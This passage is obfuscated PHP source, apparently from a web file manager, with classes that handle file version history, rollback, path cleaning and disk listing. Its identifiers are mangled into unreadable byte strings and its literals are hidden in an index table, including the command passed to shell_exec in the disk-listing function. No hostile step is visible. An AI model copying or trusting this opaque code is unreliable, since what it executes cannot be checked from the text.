self::listData($‡ÚİÊğ); $×ú²ãïã = array(); if (!$¦–ğ¦¡) { return !1; } foreach ($¦–ğ¦¡[$Íáş–ô[445]] as $šÑ½Øğ) { if ($šÑ½Øğ[$Íáş–ô[475]] == $ŠœçæÔ‡) { IO::remove($¦–ğ¦¡[$Íáş–ô[1305]] . $šÑ½Øğ[$Íáş–ô[32]]); continue; } $×ú²ãïã[] = $šÑ½Øğ; } return self::saveData($¦–ğ¦¡[$Íáş–ô[1306]], $×ú²ãïã); } public static function clear($‰—È­½í, $ÒŒ—ì®ƒ = true) { $ í¥ˆŒí =& $_SERVER[ìïæ“œî]; $¥ÂÚÀ—û = self::listData($‰—È­½í, $ÒŒ—ì®ƒ); if (!$¥ÂÚÀ—û) { return !1; } foreach ($¥ÂÚÀ—û[$ í¥ˆŒí[445]] as $Óá¡™´®) { IO::remove($¥ÂÚÀ—û[$ í¥ˆŒí[1305]] . $Óá¡™´®[$ í¥ˆŒí[32]]); } return self::saveData($¥ÂÚÀ—û[$ í¥ˆŒí[1306]], array()); } public static function moveHistory($ˆÀÎŞ¦, $²±…¦Ÿü = '', $Ïœ€ç‚‰ = '') { $àœªËÊĞ =& $_SERVER[ìïæ“œî]; $‘ÇÂ³× = self::listData($ˆÀÎŞ¦, !1); if (!$‘ÇÂ³× || !$‘ÇÂ³×[$àœªËÊĞ[445]]) { return !1; } $¾±ÖÀ½ = $àœªËÊĞ[1293]; $²±…¦Ÿü = $²±…¦Ÿü ? $²±…¦Ÿü : get_path_this($ˆÀÎŞ¦); $Ïœ€ç‚‰ = $Ïœ€ç‚‰ ? $Ïœ€ç‚‰ : $‘ÇÂ³×[$àœªËÊĞ[1305]]; $˜…® Å = substr(get_path_this($‘ÇÂ³×[$àœªËÊĞ[1306]]), 0, -strlen($¾±ÖÀ½)); foreach ($‘ÇÂ³×[$àœªËÊĞ[445]] as $²¨äó« => $î¥Ùâë) { $ÈÛÖÃÈò = $²±…¦Ÿü . substr($î¥Ùâë[$àœªËÊĞ[32]], strlen($˜…® Å)); $ êİœš« = IO::move($‘ÇÂ³×[$àœªËÊĞ[1305]] . $î¥Ùâë[$àœªËÊĞ[32]], $Ïœ€ç‚‰, !1, $ÈÛÖÃÈò); if ($ êİœš«) { $‘ÇÂ³×[$àœªËÊĞ[445]][$²¨äó«][$àœªËÊĞ[32]] = $ÈÛÖÃÈò; } } $‘ÇÂ³×[$àœªËÊĞ[1306]] = IO::move($‘ÇÂ³×[$àœªËÊĞ[1306]], $Ïœ€ç‚‰, !1, $²±…¦Ÿü . $¾±ÖÀ½); self::saveData($‘ÇÂ³×[$àœªËÊĞ[1306]], $‘ÇÂ³×[$àœªËÊĞ[445]]); self::clearEmptyFolder($‘ÇÂ³×[$àœªËÊĞ[1305]]); } public static function rollback($¢²ü•‚¤, $Á¶Ö”Ëï) { $¿™šæ¦¾ =& $_SERVER[ìïæ“œî]; $”¿¸¯ = self::listData($¢²ü•‚¤); if (!$”¿¸¯) { return; } $Èø˜í‘  = IO::info($¢²ü•‚¤); foreach ($”¿¸¯[$¿™šæ¦¾[445]] as $Ì¸˜ç´ô => $ô¡›…µŞ) { if ($ô¡›…µŞ[$¿™šæ¦¾[475]] == $Á¶Ö”Ëï) { self::add($¢²ü•‚¤); $âÛš×©â = $”¿¸¯[$¿™šæ¦¾[1305]] . $ô¡›…µŞ[$¿™šæ¦¾[32]]; $ÓËó§à¾ = IO::copy($âÛš×©â, IO::pathFather($¢²ü•‚¤), REPEAT_REPLACE, $Èø˜í‘ [$¿™šæ¦¾[32]]); if ($ÓËó§à¾) { self::remove($¢²ü•‚¤, $Á¶Ö”Ëï); } return $ÓËó§à¾; } } return !1; } public static function setDetail($îï»¸–ì, $³–¢¦ÆŞ, $¥öÏ´¬) { $Ëé÷Ó¿´ =& $_SERVER[ìïæ“œî]; $ñ¸øÌÆÖ = self::listData($îï»¸–ì); if (!$ñ¸øÌÆÖ) { return; } foreach ($ñ¸øÌÆÖ[$Ëé÷Ó¿´[445]] as $­”“ŠÆ => $¼©óÊß”) { if ($¼©óÊß”[$Ëé÷Ó¿´[475]] == $³–¢¦ÆŞ) { $ñ¸øÌÆÖ[$Ëé÷Ó¿´[445]][$­”“ŠÆ][$Ëé÷Ó¿´[1304]] = $¥öÏ´¬; self::saveData($ñ¸øÌÆÖ[$Ëé÷Ó¿´[1306]], $ñ¸øÌÆÖ[$Ëé÷Ó¿´[445]]); return !0; } } return !1; } public static function fileInfo($²ú¢“¦ú, $Ú½…ìÁ») { $½‚Æè¾ñ =& $_SERVER[ìïæ“œî]; $ûû˜¦¬Õ = self::listData($²ú¢“¦ú); if (!$ûû˜¦¬Õ) { show_json(LNG($½‚Æè¾ñ[108]), !1); } $ñ¿¸¦â = $½‚Æè¾ñ[12]; foreach ($ûû˜¦¬Õ[$½‚Æè¾ñ[445]] as $ŒáñóëÌ => $ûÛ¦ø¼Á) { if ($ûÛ¦ø¼Á[$½‚Æè¾ñ[475]] != $Ú½…ìÁ») { continue; } $ñ¿¸¦â = $ûû˜¦¬Õ[$½‚Æè¾ñ[1305]] . $ûÛ¦ø¼Á[$½‚Æè¾ñ[32]]; break; } if (!$ñ¿¸¦â) { show_json(LNG($½‚Æè¾ñ[108]), !1); } return IO::info($ñ¿¸¦â); } public static function fileOut($›î‚ø§, $„ïÇÄ—É, $°ëš¿Öê = false) { $¸Ò¡ê¿ş =& $_SERVER[ìïæ“œî]; $º‚à‘Íä = self::fileInfo($›î‚ø§, $„ïÇÄ—É); $“ÇîØü™ =& $GLOBALS[$¸Ò¡ê¿ş[7]]; $°ëš¿Öê = isset($“ÇîØü™[$¸Ò¡ê¿ş[1256]]) && $“ÇîØü™[$¸Ò¡ê¿ş[1256]] == 1; if (isset($“ÇîØü™[$¸Ò¡ê¿ş[33]]) && $“ÇîØü™[$¸Ò¡ê¿ş[33]] == $¸Ò¡ê¿ş[1307]) { return IO::fileOutImage($º‚à‘Íä[$¸Ò¡ê¿ş[87]], $“ÇîØü™[$¸Ò¡ê¿ş[1308]]); } IO::fileOut($º‚à‘Íä[$¸Ò¡ê¿ş[87]], $°ëš¿Öê, get_path_this($›î‚ø§)); } public static function listData($‰ß©âÌ, $–€ßı½­ = true) { $àÎ’É =& $_SERVER[ìïæ“œî]; if ($–€ßı½­ && !IO::exist($‰ß©âÌ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($‰ß©âÌ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ìÎËÂÄÌ = self::pathHistory($‰ß©âÌ); $Å±ŞÎÚã = array($àÎ’É[1306] => $ìÎËÂÄÌ . $àÎ’É[1293], $àÎ’É[1305] => rtrim(get_path_father($ìÎËÂÄÌ), $àÎ’É[8]) . $àÎ’É[8], $àÎ’É[445] => array()); $ö¹… ™ = IO::getContent($Å±ŞÎÚã[$àÎ’É[1306]]); if ($ö¹… ™) { $Ë¥“Ùôì = json_decode($ö¹… ™, !0); if (is_array($Ë¥“Ùôì)) { $Å±ŞÎÚã[$àÎ’É[445]] = $Ë¥“Ùôì; } } return $Å±ŞÎÚã; } private static function saveData($òËÂß¾ò, $Ã¥»ç‡’) { $„Ÿ±šÀ† =& $_SERVER[ìïæ“œî]; self::log($„Ÿ±šÀ†[1309] . $òËÂß¾ò . $„Ÿ±šÀ†[74] . count($Ã¥»ç‡’), $„Ÿ±šÀ†[801]); if ($Ã¥»ç‡’) { return IO::setContent($òËÂß¾ò, json_encode($Ã¥»ç‡’)); } $†ü€ôÇ = IO::pathFather($òËÂß¾ò); IO::remove($òËÂß¾ò); self::clearEmptyFolder($†ü€ôÇ); return !0; } public static function clearEmptyFolder($·ëÓù¸è) { $ç·±¤ª£ =& $_SERVER[ìïæ“œî]; if (trim($·ëÓù¸è, $ç·±¤ª£[8]) == trim(self::$_historyBase, $ç·±¤ª£[8])) { return; } $Çİè¼· = IO::pathFather($·ëÓù¸è); $Öı²»šº = IO::has($·ëÓù¸è, !0); if ($Öı²»šº[$ç·±¤ª£[239]] > 0 || $Öı²»šº[$ç·±¤ª£[240]] > 0) { return; } IO::remove($·ëÓù¸è); self::clearEmptyFolder($Çİè¼·); } private static function getBasePath() { $ËùäœÆæ =& $_SERVER[ìïæ“œî]; $Ë–ş¹—ı = Model($ËùäœÆæ[1310])->get($ËùäœÆæ[1311]); if ($Ë–ş¹—ı) { if (!IO::exist($Ë–ş¹—ı)) { IO::mkdir($Ë–ş¹—ı); } if (get_path_this($Ë–ş¹—ı) == $ËùäœÆæ[1296]) { $…šê ©à = $ËùäœÆæ[1312] . rand_string(8); @rename($Ë–ş¹—ı, get_path_father($Ë–ş¹—ı) . $ËùäœÆæ[8] . $…šê ©à); $Ë–ş¹—ı = DATA_PATH . $…šê ©à . $ËùäœÆæ[8]; file_put_contents(DATA_PATH . $ËùäœÆæ[1243], $ËùäœÆæ[12]); Model($ËùäœÆæ[1310])->set($ËùäœÆæ[1311], $Ë–ş¹—ı); } return $Ë–ş¹—ı; } $Ë–ş¹—ı = DATA_PATH . $ËùäœÆæ[1312] . rand_string(8) . $ËùäœÆæ[8]; $Ë–ş¹—ı = IO::mkdir($Ë–ş¹—ı); $Ë–ş¹—ı = rtrim($Ë–ş¹—ı, $ËùäœÆæ[8]) . $ËùäœÆæ[8]; file_put_contents($Ë–ş¹—ı . $ËùäœÆæ[1243], $ËùäœÆæ[12]); file_put_contents(DATA_PATH . $ËùäœÆæ[1243], $ËùäœÆæ[12]); Model($ËùäœÆæ[1310])->set($ËùäœÆæ[1311], $Ë–ş¹—ı); return $Ë–ş¹—ı; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\x52\x65\x63\x79\143\154\145\175"; const KOD_USER_FAV = "\x7b\165\163\x65\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\x69\x6c\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\x72\106\151\x6c\x65\x54\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\160\x52\x6f\157\164\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\163\145\x72\123\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\x53\x68\x61\162\x65\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\x65\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\x65\111\164\145\x6d\114\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\142\154\157\x63\x6b\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\122\145\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\166\x65\x72\175"; public static function typeList() { $Û®Úà‚ =& $_SERVER[ìïæ“œî]; return array($Û®Úà‚[1313] => self::KOD_SOURCE, $Û®Úà‚[1314] => self::KOD_USER_RECYCLE, $Û®Úà‚[1315] => self::KOD_USER_FAV, $Û®Úà‚[1316] => self::KOD_USER_FILE_TAG, $Û®Úà‚[1317] => self::KOD_USER_FILE_TYPE, $Û®Úà‚[1318] => self::KOD_GROUP_ROOT_SELF, $Û®Úà‚[1319] => self::KOD_USER_SHARE, $Û®Úà‚[1320] => self::KOD_USER_SHARE_LINK, $Û®Úà‚[1321] => self::KOD_USER_SHARE_TO_ME, $Û®Úà‚[1322] => self::KOD_SHARE_ITEM, $Û®Úà‚[1323] => self::KOD_SHARE_LINK, $Û®Úà‚[1324] => self::KOD_SEARCH, $Û®Úà‚[1325] => self::KOD_BLOCK, $Û®Úà‚[1326] => self::KOD_IO, $Û®Úà‚[1327] => self::KOD_USER_RECENT, $Û®Úà‚[1328] => self::KOD_USER_DRIVER); } public static function parse($éö¬ø¤§) { $ÒÏäéÈ =& $_SERVER[ìïæ“œî]; $éö¬ø¤§ = self::clear($éö¬ø¤§); $¡½ªîó = array_values(self::typeList()); preg_match($ÒÏäéÈ[1329], $éö¬ø¤§, $ Á„ƒËœ); $¥…áóÌê = array($ÒÏäéÈ[496] => !1, $ÒÏäéÈ[1330] => !1, $ÒÏäéÈ[493] => !1, $ÒÏäéÈ[87] => $éö¬ø¤§, $ÒÏäéÈ[1228] => !1, $ÒÏäéÈ[1227] => $ÒÏäéÈ[12]); if (is_array($ Á„ƒËœ) && count($ Á„ƒËœ) == 5) { $œÀ¬ëÛÕ = $ÒÏäéÈ[1331] . $ Á„ƒËœ[2] . $ÒÏäéÈ[403]; if (in_array($œÀ¬ëÛÕ, $¡½ªîó)) { $¥…áóÌê[$ÒÏäéÈ[1228]] = $ Á„ƒËœ[1]; $¥…áóÌê[$ÒÏäéÈ[33]] = $œÀ¬ëÛÕ; $¥…áóÌê[$ÒÏäéÈ[1332]] = substr($œÀ¬ëÛÕ, 1, -1); $¥…áóÌê[$ÒÏäéÈ[475]] = $ Á„ƒËœ[3]; } $¥…áóÌê[$ÒÏäéÈ[1227]] = $ Á„ƒËœ[4]; } $ÆÊîÆİ– = array($ÒÏäéÈ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¥…áóÌê[$ÒÏäéÈ[1295]] = in_array($¥…áóÌê[$ÒÏäéÈ[33]], $ÆÊîÆİ–); return $¥…áóÌê; } public static function isTruePath($ÉúÖª‚è) { $şĞÙ–şß =& $_SERVER[ìïæ“œî]; if (substr($ÉúÖª‚è, 0, 1) != $şĞÙ–şß[1331]) { return !0; } if (strpos($ÉúÖª‚è, $şĞÙ–şß[483]) === 0) { return !0; } if (strpos($ÉúÖª‚è, $şĞÙ–şß[1299]) === 0) { return !0; } if (strpos($ÉúÖª‚è, $şĞÙ–şß[1333]) === 0) { return !0; } if (strpos($ÉúÖª‚è, $şĞÙ–şß[1334]) === 0) { return !0; } if (strpos($ÉúÖª‚è, $şĞÙ–şß[1335]) === 0) { return !0; } return !1; } public static function clear($¦Şìä´Ù) { $£®šÒÉ— =& $_SERVER[ìïæ“œî]; $¦Şìä´Ù = str_replace(array($£®šÒÉ—[1134], $£®šÒÉ—[262]), $£®šÒÉ—[53], $¦Şìä´Ù); $¦Şìä´Ù = str_replace($£®šÒÉ—[100], $£®šÒÉ—[8], $¦Şìä´Ù); $‚«è¡‚½ = $£®šÒÉ—[1336]; if (substr($¦Şìä´Ù, 0, 3) == $£®šÒÉ—[1337]) { $¦Şìä´Ù = substr($¦Şìä´Ù, 3); } while (strstr($¦Şìä´Ù, $‚«è¡‚½)) { $¦Şìä´Ù = str_replace($‚«è¡‚½, $£®šÒÉ—[8], $¦Şìä´Ù); } $¦Şìä´Ù = preg_replace($£®šÒÉ—[1338], $£®šÒÉ—[8], $¦Şìä´Ù); if ($¦Şìä´Ù == $£®šÒÉ—[8]) { return $£®šÒÉ—[8]; } $¦Şìä´Ù = rtrim($¦Şìä´Ù, $£®šÒÉ—[8]); return $¦Şìä´Ù; } public static function pathTrue($İÑ¶º•ù) { $º´Ğåù‰ =& $_SERVER[ìïæ“œî]; if (!$İÑ¶º•ù) { return $º´Ğåù‰[12]; } $İÑ¶º•ù = str_replace($º´Ğåù‰[592], $º´Ğåù‰[8], str_replace($º´Ğåù‰[1339], $º´Ğåù‰[8], $İÑ¶º•ù)); $İÑ¶º•ù = str_replace($º´Ğåù‰[592], $º´Ğåù‰[8], str_replace($º´Ğåù‰[1339], $º´Ğåù‰[8], $İÑ¶º•ù)); if (!strstr($İÑ¶º•ù, $º´Ğåù‰[1337])) { return $İÑ¶º•ù; } $ø»Ø¹Ÿ = explode($º´Ğåù‰[8], $İÑ¶º•ù); foreach ($ø»Ø¹Ÿ as $é©‘æîƒ => $ø†÷ş”¬) { if ($ø†÷ş”¬ !== $º´Ğåù‰[1340]) { continue; } for ($âë»ºÀÚ = $é©‘æîƒ; $âë»ºÀÚ >= 0; $âë»ºÀÚ--) { if ($ø»Ø¹Ÿ[$âë»ºÀÚ] === $º´Ğåù‰[10] || $ø»Ø¹Ÿ[$âë»ºÀÚ] === $º´Ğåù‰[1340] || $ø»Ø¹Ÿ[$âë»ºÀÚ] === -1) { continue; } if ($ø»Ø¹Ÿ[$âë»ºÀÚ] === $º´Ğåù‰[12]) { $ø»Ø¹Ÿ[$é©‘æîƒ] = -1; break; } $ø»Ø¹Ÿ[$é©‘æîƒ] = -1; $ø»Ø¹Ÿ[$âë»ºÀÚ] = -1; break; } } $òÅıÁ˜ß = array(); foreach ($ø»Ø¹Ÿ as $ø†÷ş”¬) { if ($ø†÷ş”¬ !== -1) { $òÅıÁ˜ß[] = $ø†÷ş”¬; } } $×ÓŠ±Á± = implode($º´Ğåù‰[8], $òÅıÁ˜ß); if (strpos($×ÓŠ±Á±, $º´Ğåù‰[1341]) === 0) { $×ÓŠ±Á± = $º´Ğåù‰[1337] . substr($×ÓŠ±Á±, strlen($º´Ğåù‰[1341])); } return $×ÓŠ±Á±; } public static function pathUrlClear($¾©ÅËç´) { $•œ¼× =& $_SERVER[ìïæ“œî]; if (!$¾©ÅËç´) { return $¾©ÅËç´; } $¾©ÅËç´ = rawurldecode($¾©ÅËç´); $¾©ÅËç´ = str_replace($•œ¼×[1339], $•œ¼×[8], $¾©ÅËç´); if (strpos($¾©ÅËç´, $•œ¼×[76]) > 0) { $¾©ÅËç´ = substr($¾©ÅËç´, 0, strpos($¾©ÅËç´, $•œ¼×[76])); } if (strpos($¾©ÅËç´, $•œ¼×[1342]) > 0) { $¾©ÅËç´ = substr($¾©ÅËç´, 0, strpos($¾©ÅËç´, $•œ¼×[1342])); } return $¾©ÅËç´; } public static function sourceID($»¡ğ½ó„) { $Ù‚ÉĞ» =& $_SERVER[ìïæ“œî]; $¶İÜÕãÔ = self::parse($»¡ğ½ó„); if ($¶İÜÕãÔ[$Ù‚ÉĞ»[33]] !== self::KOD_SOURCE) { show_json(LNG($Ù‚ÉĞ»[1343]), !1); } return $¶İÜÕãÔ[$Ù‚ÉĞ»[475]]; } public static function make($ò¸Å…è¾) { if (!$ò¸Å…è¾) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ò¸Å…è¾)); } public static function makeShare($Ï«‚©Èû, $õ¬³Ù¥ª) { return self::makePath(self::KOD_SHARE_ITEM, $Ï«‚©Èû, $õ¬³Ù¥ª); } public static function makeFileTypePath($ò¯‚º Ó) { return self::makePath(self::KOD_USER_FILE_TYPE, $ò¯‚º Ó); } public static function makeFileTagPath($ë®Ò¾ø) { return self::makePath(self::KOD_USER_FILE_TAG, $ë®Ò¾ø); } public static function makePath($âæÇº‚œ, $Íéà÷‹ï = '', $“„‚œ¾ = '') { $ÀışÇ³û =& $_SERVER[ìïæ“œî]; $ÒÙËÕÅ = substr($âæÇº‚œ, 1, -1); $¸Ëë¸Ä³ = $ÀışÇ³û[1344] . $ÒÙËÕÅ . $ÀışÇ³û[1345] . $Íéà÷‹ï . $ÀışÇ³û[1346]; $¸Ëë¸Ä³ = $“„‚œ¾ ? $¸Ëë¸Ä³ . $“„‚œ¾ . $ÀışÇ³û[8] : $¸Ëë¸Ä³; return $¸Ëë¸Ä³; } public static function hashPath($‘°‹ß¼, $Œ¾Ç¨Œ = true) { $–ªï²Ü =& $_SERVER[ìïæ“œî]; $œâŠœ = is_array($‘°‹ß¼) ? $‘°‹ß¼ : IO::info($‘°‹ß¼); $¡î¤òŸÈ = _get($œâŠœ, $–ªï²Ü[1347], $–ªï²Ü[12]); if (!$¡î¤òŸÈ && isset($œâŠœ[$–ªï²Ü[235]])) { $¡î¤òŸÈ = trim($œâŠœ[$–ªï²Ü[235]], $–ªï²Ü[121]); } if (!$¡î¤òŸÈ && isset($œâŠœ[$–ªï²Ü[193]]) && $œâŠœ[$–ªï²Ü[193]]) { $œâŠœ = IO::info(KodIO::make($œâŠœ[$–ªï²Ü[193]])); $¡î¤òŸÈ = _get($œâŠœ, $–ªï²Ü[1347], $–ªï²Ü[12]); } $”·ĞøÅï = md5($œâŠœ[$–ªï²Ü[87]] . $œâŠœ[$–ªï²Ü[79]] . $œâŠœ[$–ªï²Ü[88]]); if (!$¡î¤òŸÈ && file_exists($œâŠœ[$–ªï²Ü[87]])) { $¡î¤òŸÈ = Cache::get($”·ĞøÅï . $–ªï²Ü[1348]); $¡î¤òŸÈ = !1; if (!$¡î¤òŸÈ) { $¡î¤òŸÈ = IO::hashSimple($œâŠœ[$–ªï²Ü[87]]); Cache::set($”·ĞøÅï . $–ªï²Ü[1348], $¡î¤òŸÈ, 3600 * 24 * 30); } } if ($Œ¾Ç¨Œ && !$¡î¤òŸÈ) { } return $¡î¤òŸÈ ? $¡î¤òŸÈ : $”·ĞøÅï; } public static function hashPathSafe($¨«´§ß›, $¦ŒÄşï = true) { $¹ÃŒßÓ =& $_SERVER[ìïæ“œî]; $ÈÌ½µÉ = self::hashPath($¨«´§ß›, $¦ŒÄşï); return md5($ÈÌ½µÉ . $¹ÃŒßÓ[1349] . Model($¹ÃŒßÓ[819])->get($¹ÃŒßÓ[820])); } public static function initSystemPath() { $öà¾˜„ˆ =& $_SERVER[ìïæ“œî]; if (defined($öà¾˜„ˆ[1350])) { return; } define($öà¾˜„ˆ[1350], self::systemPath($öà¾˜„ˆ[191])); define($öà¾˜„ˆ[1351], self::systemPath($öà¾˜„ˆ[1352])); define($öà¾˜„ˆ[1353], self::systemPath($öà¾˜„ˆ[1354])); define($öà¾˜„ˆ[1355], self::systemPath($öà¾˜„ˆ[1356])); IOHistory::bindEvent(); } public static function systemPath($’‡şœ‚) { $ß±¥õİ× =& $_SERVER[ìïæ“œî]; $âœ””ÄÚ = $ß±¥õİ×[1357] . ucfirst($’‡şœ‚); $Óà‘°Ïƒ = Model($ß±¥õİ×[819])->get($âœ””ÄÚ); if ($Óà‘°Ïƒ) { return $Óà‘°Ïƒ; } if ($’‡şœ‚ == $ß±¥õİ×[191]) { $Óà‘°Ïƒ = self::make(Model($ß±¥õİ×[873])->systemRootPathAdd($ß±¥õİ×[605])); } else { $Óà‘°Ïƒ = self::systemPath($ß±¥õİ×[191]); $šÄ×ØÖ· = self::sourceID($Óà‘°Ïƒ); $Óà‘°Ïƒ = self::make(Model($ß±¥õİ×[873])->mkdir($šÄ×ØÖ·, $’‡şœ‚)); } Model($ß±¥õİ×[819])->set($âœ””ÄÚ, $Óà‘°Ïƒ); return $Óà‘°Ïƒ; } public static function systemFolder($õàÙØ£½) { $‡Ë¦‡Ç¾ = IO_PATH_SYSTEM_SOURCE . $õàÙØ£½; $áŞ¿å´¼ = Cache::get($‡Ë¦‡Ç¾); if (!$áŞ¿å´¼) { $šøÑ»—‚ = IO::infoFullSimple($‡Ë¦‡Ç¾); if (!$šøÑ»—‚) { $áŞ¿å´¼ = IO::mkdir($‡Ë¦‡Ç¾, REPEAT_SKIP); } else { $áŞ¿å´¼ = $šøÑ»—‚[$_SERVER[ìïæ“œî][87]]; } Cache::set($‡Ë¦‡Ç¾, $áŞ¿å´¼, 3600 * 10); } return $áŞ¿å´¼; } public static function defaultDriver() { return Model($_SERVER[ìïæ“œî][816])->defaultDriver(); } public static function defaultIO() { $€û•îûÏ =& $_SERVER[ìïæ“œî]; $±ÖäÀŞ¬ = self::defaultDriver(); return $€û•îûÏ[1358] . $±ÖäÀŞ¬[$€û•îûÏ[475]] . $€û•îûÏ[1346]; } public static function defaultDriverInit() { static $Œäò„á = false; if ($Œäò„á) { return $Œäò„á; } $Œäò„á = IO::init(self::defaultIO()); return $Œäò„á; } public static function fileTypeList() { $“Ş’ıãÅ =& $_SERVER[ìïæ“œî]; $Ò¼µŒ = $GLOBALS[$“Ş’ıãÅ[6]][$“Ş’ıãÅ[1359]]; foreach ($Ò¼µŒ as $Œƒ˜ø£“ => $´ı¹ï´Â) { $Ú–¾Ò¹‘ = $“Ş’ıãÅ[1360] . $Œƒ˜ø£“; $¢ƒş†ëÖ = LNG($Ú–¾Ò¹‘); if ($Ú–¾Ò¹‘ != $¢ƒş†ëÖ) { $Ò¼µŒ[$Œƒ˜ø£“][$“Ş’ıãÅ[32]] = $¢ƒş†ëÖ; } } return $Ò¼µŒ; } public static function diskList($ÑÉğ«¤¯ = true) { $ú¹ş¡ğ = $_SERVER[ìïæ“œî][1361]; if ($ÑÉğ«¤¯) { $‹€Úµµ§ = Cache::get($ú¹ş¡ğ); if (is_array($‹€Úµµ§)) { return $‹€Úµµ§; } } $‹€Úµµ§ = self::diskListGet(); Cache::set($ú¹ş¡ğ, $‹€Úµµ§, 60); return $‹€Úµµ§; } public static function diskListGet() { $²ãÉı¾· =& $_SERVER[ìïæ“œî]; $õ£ÕœÔ¾ = array(); if ($GLOBALS[$²ãÉı¾·[6]][$²ãÉı¾·[1362]] == $²ãÉı¾·[1363]) { $ÓÑ ßû¼ = $²ãÉı¾·[1364]; for ($¨ÃŠËˆ° = 0; $¨ÃŠËˆ° < strlen($ÓÑ ßû¼); $¨ÃŠËˆ°++) { $Å°ÒÃ€¶ = $ÓÑ ßû¼[$¨ÃŠËˆ°] . $²ãÉı¾·[1365]; if (file_exists($Å°ÒÃ€¶)) { $õ£ÕœÔ¾[] = $Å°ÒÃ€¶; } } return $õ£ÕœÔ¾; } if (!function_exists($²ãÉı¾·[101])) { $õ£ÕœÔ¾[] = $²ãÉı¾·[884]; return $õ£ÕœÔ¾; } $èŞÜ—î = explode($²ãÉı¾·[262], shell_exec($²ãÉı¾·[1366])); array_shift($èŞÜ—î); array_pop($èŞÜ—î); $ŠñÀıÖ = array($²ãÉı¾·[1367], $²ãÉı¾·[1368], $²ãÉı¾·[1369], $²ãÉı¾·[1370], $²ãÉı¾·[1371], $²ãÉı¾·[1372], $²ãÉı¾·[1373], $²ãÉı¾·[1374]); foreach ($èŞÜ—î as $æ‘åê·¹) { $€‹î¿½ = preg_split($²ãÉı¾·[1375], $æ‘åê·¹); $Å°ÒÃ€¶ = $€‹î¿½[count($€‹î¿½) - 1]; if (!strstr($€‹î¿½[0], $²ãÉı¾·[1376]) || !$Å°ÒÃ€¶) { continue; } $Ù†ù—¬’ = rtrim($Å°ÒÃ€¶, $²ãÉı¾·[8]) . $²ãÉı¾·[8]; if (in_array($Ù†ù—¬’, $ŠñÀıÖ)) { continue; } $õ£ÕœÔ¾[] = $Ù†ù—¬’; } return $õ£ÕœÔ¾; } public static function isSameDisk($…Ìğ“Ë, $‘’Í™·•) { $®Ğ£İ­Ñ =& $_SERVER[ìïæ“œî]; if ($GLOBALS[$®Ğ£İ­Ñ[6]][$®Ğ£İ­Ñ[1362]] == $®Ğ£İ­Ñ[1363]) { return strtolower(substr($…Ìğ“Ë, 0, 1)) == strtolower(substr($‘’Í™·•, 0, 1)); } $Ãè°‹Ù„ = self::diskList(); $Ç¹¿ÍÍÑ = !1; $„û«¡¸Š = !1; sort($Ãè°‹Ù„); $Ãè°‹Ù„ = array_reverse($Ãè°‹Ù„); $…Ìğ“Ë = rtrim($…Ìğ“Ë, $®Ğ£İ­Ñ[8]) . $®Ğ£İ­Ñ[8]; $‘’Í™·• = rtrim($‘’Í™·•, $®Ğ£İ­Ñ[8]) . $®Ğ£İ­Ñ[8]; foreach ($Ãè°‹Ù„ as $¸«ëä¿Ï) { $ûğßÂùí = strlen($¸«ëä¿Ï); if (!$Ç¹¿ÍÍÑ && substr($…Ìğ“Ë, 0, $ûğßÂùí) == $¸«ëä¿Ï) { $Ç¹¿ÍÍÑ = $¸«ëä¿Ï; } if (!$„û«¡¸Š && substr($‘’Í™·•, 0, $ûğßÂùí) == $¸«ëä¿Ï) { $„û«¡¸Š = $¸«ëä¿Ï; } if ($Ç¹¿ÍÍÑ && $„û«¡¸Š) { break; } } return $Ç¹¿ÍÍÑ === $„û«¡¸Š; } public static function transferType($†¼çë“¦, $ºĞ­ä£Î) { $È¢»Á²Ç =& $_SERVER[ìïæ“œî]; $½öË®Ú  = self::driverType($†¼çë“¦); $†è¥é¼½ = self::driverType($ºĞ­ä£Î); if ($½öË®Ú [$È¢»Á²Ç[33]] == $†è¥é¼½[$È¢»Á²Ç[33]] && $½öË®Ú [$È¢»Á²Ç[1377]] == $†è¥é¼½[$È¢»Á²Ç[1377]]) { return $È¢»Á²Ç[1378]; } if ($½öË®Ú [$È¢»Á²Ç[33]] == $È¢»Á²Ç[917] && $†è¥é¼½[$È¢»Á²Ç[33]] == $È¢»Á²Ç[109]) { return $È¢»Á²Ç[1256]; } if ($½öË®Ú [$È¢»Á²Ç[33]] == $È¢»Á²Ç[109] && $†è¥é¼½[$È¢»Á²Ç[33]] == $È¢»Á²Ç[917]) { return $È¢»Á²Ç[110]; } return $È¢»Á²Ç[1379]; } public static function driverType($§’¦â±‹) { $ÎúØ¶şù =& $_SERVER[ìïæ“œî]; $ù‚»²í = str_replace($ÎúØ¶şù[1380], $ÎúØ¶şù[12], strtolower($§’¦â±‹->getType())); if ($ù‚»²í == $ÎúØ¶şù[806] || $ù‚»²í == $ÎúØ¶şù[1381] || $ù‚»²í == $ÎúØ¶şù[1382]) { $§’¦â±‹ = self::defaultDriverInit(); } else { if ($ù‚»²í == $ÎúØ¶şù[1266] || $ù‚»²í == $ÎúØ¶şù[1383]) { $§’¦â±‹ = IO::init($§’¦â±‹->pathParse[$ÎúØ¶şù[1209]]); } } $ÊúÎï‰€ = $§’¦â±‹->path; $ù‚»²í = str_replace($ÎúØ¶şù[1380], $ÎúØ¶şù[12], 